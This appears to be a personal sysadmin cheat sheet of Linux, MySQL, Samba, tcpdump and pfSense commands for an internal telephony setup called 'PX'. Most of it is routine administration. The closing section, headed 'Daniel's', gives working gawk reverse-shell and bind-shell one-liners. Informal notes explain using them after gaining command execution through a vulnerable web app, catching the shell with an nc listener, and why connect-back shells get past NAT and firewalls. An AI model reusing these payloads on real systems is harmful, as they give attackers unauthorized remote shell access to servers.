##############
## Commands ##
##############

##########
#Display line terminators
od -c filename

##########
#find everything on the system with 10.100 ignoring some dirs
find / -path /sys -prune -o -path /dev -prune -o \
-path /proc -prune -o -path /var/log -prune -o \
-type f -exec grep -Hn "10\.100\.0\.230" {} \; 2>/dev/null | tee /root/found.txt

##########
#find filename, case insensitive
find . -iname "foobar"

##########
#find files that are not bz2
find . -type f -not -name “*.bz2” -exec ls -lh {} \;

##########
#Convert xml/xlsx to csv
libreoffice --headless --convert-to csv $filename --outdir $outdir

##########
#prune log for only last 1500 lines using vim command
vim "+execute \"normal! G1500kO\<esc>dgg\"" "+w" "+q" nightlyrepair.log

##########
#Extract table from mysqldump
sed -n -e '/DROP TABLE IF EXISTS `phones`/,/UNLOCK TABLES/p' cold4db-05-11-2016-Wednesday.sql >> patch-phones.sql
sed -i 's/INSERT INTO/INSERT IGNORE INTO/g' patch-phones.sql

##########
#Delete between 'foo' and 'bar' inclusively
sed -i '/foo/,/bar/d' file.txt

##########
#Comment out a line in a file
sed -e '/replicate_wild_ignore_table=asterisk.call_log/ s/^#*/#/' -i /etc/my.cnf

##########
#Clear disk cache from ram
sync; echo 1 > /proc/sys/vm/drop_caches

##########
#Sort ls by size ascending
ls -lSr
#this^ is a capitol S

##########
#useradd vs adduser
useradd-only add user name to /etc/passwd
adduser-uses useradd and creates groups and home dirs etc

##########
#Add user to existing group
usermod -a -G groupname user

##########
#Remove user from group
gpasswd -d user group

##########
#Make samba user
pdbedit -L -v
useradd name; passwd -l name; smbpasswd -a name
/etc/samba/smb.cnf: valid users = @groupname
service samba reload

##########
#Check and enable query logging temp
#If it only has a file name, will be in data dir
mysql> SHOW VARIABLES LIKE '%log%';
mysql> SET GLOBAL general_log_file = '/var/log/mysql/general.log';
mysql> SET GLOBAL general_log = 'ON';
#To turn back off
mysql> SET GLOBAL general_log = 'OFF';

##########
#To skip broken sql slave query
mysql> STOP SLAVE;
mysql> SET GLOBAL sql_slave_skip_counter = 1;
mysql> START SLAVE;
mysql> SHOW SLAVE STATUS \G

##########
#Change mariadb password
SET PASSWORD FOR 'user'@'%' = PASSWORD('newpass');

##########
#Change mysql password
#For version => 5.7.6
mysql> ALTER USER 'root'@'localhost' IDENTIFIED BY 'MyNewPass';
#For version < 5.7.6
mysql> SET PASSWORD FOR 'root'@'localhost' = PASSWORD('MyNewPass');

##########
#Replication vars, use only what's necessary
mastermysql> SHOW MASTER STATUS;
slavemysql> CHANGE MASTER TO
    ->     MASTER_HOST='master_host_name/ip',
    ->     MASTER_USER='replication_user_name',
    ->     MASTER_PASSWORD='replication_password',
    ->     MASTER_LOG_FILE='recorded_log_file_name',
    ->     MASTER_LOG_POS=recorded_log_position;

#########
#Replace strings in mysql
update voices_files set `file` = replace(`file`, 'voice-63', 'voice-65');

#########
#Wipe states for specific routes on pfsense
pfctl -k 172.30.65.0/24 && pfctl -k 63.245.47.246

##########
##  PX  ##
##########
#Load script in gui
http://10.101.15.51

#Normalize audio
ssh 10.101.15.51; normalize-audio /playback/voice-#/*.wav

#sync the audio files to all px
rsync -avz --delete /playback/ /playback-copy/ && /ProjectX-Server/scripts/playback-rsync-new.sh

#Reload scripts
10.101.3.5:2288/Status/  Hit Refresh Scripts
Do this for every px

#############
## tcpdump ##
#############
# capture port 5060 in or out one ip
tcpdump -n -i eth1 -vvvvv "(src here and port 5060)  or (dst here and port 5060)" -w capture.pcap

# capture port 5060 in or out two ip
tcpdump -n -i eth1 -vvvvv "(src here and port 5060)  or (dst here and port 5060) or (src cho and port 5060)  or (dst cho and port 5060)" -w capture.pcap

# capture everything ports 5k+
tcpdump -i eth1 -vvvv "dst portrange 5000-65535 or src portrange 5000-65535" -w capture.pcap

# capture everything
tcpdump -i eth1 -vvvv -w capture.pcap


############
# PX Debug #
############
-ssh px
--service xrdp start
-remmina rdp pxip
--jvisualvm or jconsole
-service xrdp stop

############
# Daniel's #
############
gawk 'BEGIN {P=443;S="bkd> ";H="192.168.1.100";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
change P to the port you want it to connect to
and H to the host you connect to
so..
say i am goign to attack skunkworks
i have command exectution on skunkworks through some shit web app for instance
to get a shell, i would modify that bullshit
to connect back to my machine
and on my machine, nc -nlvp 443
then execute that gawk shit on skunkworks, and get a shell
on my machine as www user or whatever
gawk 'BEGIN {P=88;S="bkd> ";V="/inet/tcp/"P"/0/0";while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
that's a bind shell
so you can modify that
change P=88 to whatever port you want it to bind a shell on
then from my machine, nc skunkworks 88
and i have a shell
the connect back shells are typically the go-tos
because shit may be behind NAT
and a lot of times, people firewall incoming everything, then allow each service
so the bind shell may succeed, but you cant get to it because firewall
